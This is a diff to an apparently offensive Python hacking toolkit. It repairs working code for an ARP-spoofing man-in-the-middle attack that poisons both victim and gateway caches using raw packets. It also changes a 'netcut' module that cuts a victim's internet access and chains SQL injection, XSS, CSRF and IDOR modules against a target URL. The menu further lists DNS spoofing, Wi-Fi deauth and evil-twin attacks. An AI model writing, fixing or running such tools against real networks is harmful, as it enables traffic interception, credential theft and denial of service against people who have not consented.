@@ -199,47 +199,63 @@ def mod_mitm():
         rng = int(rng)
     except ValueError: print("bad seconds"); return
     def mac(ip):
-        out = subprocess.run(["cat", f"/proc/net/arp"], capture_output=True, text=True).stdout
+        # returns colon format; normalize to raw hex
+        out = subprocess.run(["cat", "/proc/net/arp"], capture_output=True, text=True).stdout
         for line in out.splitlines()[1:]:
-            if line.split()[0] == ip: return line.split()[3]
+            f = line.split()
+            if len(f) >= 4 and f[0] == ip: return f[3].replace(":", "")
         return None
+    import struct
+    import fcntl
+    def own_mac(iface):
+        # get THIS interface's real MAC (the attacker's own addressing)
+        try:
+            s0 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            r = fcntl.ioctl(s0.fileno(), 0x8927, struct.pack("256s", iface[:15].encode()))
+            return ":".join(f"{b:02x}" for b in r[18:24]).replace(":", "")
+        except Exception:
+            return None
     print("resolving victim MAC...")
     vmac = mac(vi)
     if not vmac:
         print(f"victim {vi} not in ARP table — ping first"); return
-    print(f"victim {vi} @ {vmac}")
+    print(f"victim {vi} @ {':'.join(vmac[i:i+2] for i in range(0,12,2))}") if len(vmac)==12 else print(f"victim {vi} @ {vmac}")
+    amac = own_mac(iface) or vmac  # fallback: victim MAC (not ideal, but avoids none)
+    if not amac:
+        print(f"cannot resolve own MAC on {iface} — check interface name"); return
+    print(f"attacker (via {iface}) @ {':'.join(amac[i:i+2] for i in range(0,12,2))}")
     s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
     s.bind((iface, 0))
-    gmac = mac(gw) or "ff:ff:ff:ff:ff:ff"
-    def pkt(dst_host, src_host, op):
-        # ARP packet: hw 1, proto 0x0800, hlen 6, plen 4, op
-        import struct
+    gmac = mac(gw) or "ffffffffffff"
+    def pkt(claims_mac, claims_ip, op, dst_mac=b"\xff\xff\xff\xff\xff\xff"):
+        # ARP frame: src MAC = attacker own MAC (amac); sender = claims_mac@claims_ip
         p = struct.pack("!HHBBH", 1, 0x0800, 6, 4, op)
-        p += bytes.fromhex(vmac) + socket.inet_aton(vi)
-        p += bytes.fromhex(dst_host) + socket.inet_aton(src_host)
-        return b"\xff\xff\xff\xff\xff\xff" + bytes.fromhex(vmac) + b"\x08\x06" + p
-    stop = False
+        p += bytes.fromhex(claims_mac) + socket.inet_aton(claims_ip)
+        p += bytes.fromhex(gmac if claims_ip == gw else vmac) + socket.inet_aton(gw if claims_ip == gw else vi)
+        return dst_mac + bytes.fromhex(amac) + b"\x08\x06" + p
+    # spoof BOTH directions: tell victim that gw is at MY mac; tell gw that vi is at MY mac
+    def spoof_once():
+        s.send(pkt(amac, gw, 1))   # reply to victim: "gw is amac" (broadcast)
+        s.send(pkt(amac, vi, 1))   # reply to gw: "vi is amac" (broadcast)
     def restore():
-        # send correct ARP back to heal the cache
+        # heal both caches with TRUE mapping
         for _ in range(3):
             try:
-                got = mac(vi)
-                rmac = got or gmac
-                if rmac:
-                    s.send(pkt(rmac, gw, 2))
-                s.send(pkt(gmac, vi, 2))
+                s.send(pkt(gmac, gw, 2))   # victim: gw really at gmac
+                s.send(pkt(vmac, vi, 2))   # gateway: vi really at vmac
+                time.sleep(0.1)
             except Exception: pass
     print(f"spoofing {vi}<->{gw} for {rng}s (ctrl-c to stop early). capturing is passive; run tcpdump/tshark in parallel.")
     t0 = time.time()
     try:
         while time.time() - t0 < rng:
-            s.send(pkt(gw, vi, 1))   # vi -> attacker (we claim gw)
-            s.send(pkt(vi, gw, 1))   # gw -> attacker (we claim vi)
+            spoof_once()
             time.sleep(1)
     except KeyboardInterrupt:
         pass
     finally:
         restore()
+        s.close()
         print("restored ARP.")
 
 # ---------------------------------------------------------------- netcut (cut internet target)
@@ -292,10 +308,10 @@ def mod_netcut():
         broadcast(arp_frame(DUMMY_MAC, DUMMY_MAC, gw, vi, 2))   # vi: gw <= dummy
         broadcast(arp_frame(DUMMY_MAC, DUMMY_MAC, vi, gw, 2))   # gw: vi  <= dummy
     def restore():
-        for _ in range(3):
-            broadcast(arp_frame(vmac, gmac_raw, gw, vi, 2))     # vi: gw benar
-            broadcast(arp_frame(gmac_raw, vmac, vi, gw, 2))       # gw: vi benar
-            time.sleep(0.1)
+        # correct ARP entries: tell victim "gw at gmac", tell gateway "vi at vmac"
+        # arp_frame(dst, src, target_ip, sender_ip, op=2 reply)
+        broadcast(arp_frame(vmac, gmac_raw, vi, gw, 2))   # to victim: "gw at gmac" (sender=gmac@gw)
+        broadcast(arp_frame(gmac_raw, vmac, gw, vi, 2))   # to gateway: "vi at vmac" (sender=vmac@vi)
     print(f"cutting internet {vi} for {rng}s (arp gw->dummy). ctrl-c = restore segera.")
     t0 = time.time()
     try:
@@ -591,13 +607,22 @@ def mod_websec():
         if not url: print("no url"); return
         order = {"a": mod_sqli, "b": mod_xss, "c": mod_csrf, "d": mod_idor}
         if sel == "auto":
-            # chained run: sqli -> xss -> csrf -> idor all against url (with sensible prompts)
+            # pass the chosen url to each module via GINJ so they don't re-prompt
+            import __main__
+            orig = list(__main__.GINJ)
             for fn in (mod_sqli, mod_xss, mod_csrf, mod_idor):
+                __main__.GINJ = [url]
                 fn()
+            __main__.GINJ = orig
         else:
+            import __main__
+            orig = list(__main__.GINJ)
             for ch in sel.split(","):
                 ch = ch.strip()
-                if ch in order: order[ch]()
+                if ch in order:
+                    __main__.GINJ = [url]
+                    order[ch]()
+            __main__.GINJ = orig
     elif cat == "2":
         print("\na. mitm (arp spoof)   b. dnsspoof   c. netcut (cut internet)")
         print("   d. deauth (kick wifi) e. sniff   f. eviltwin")
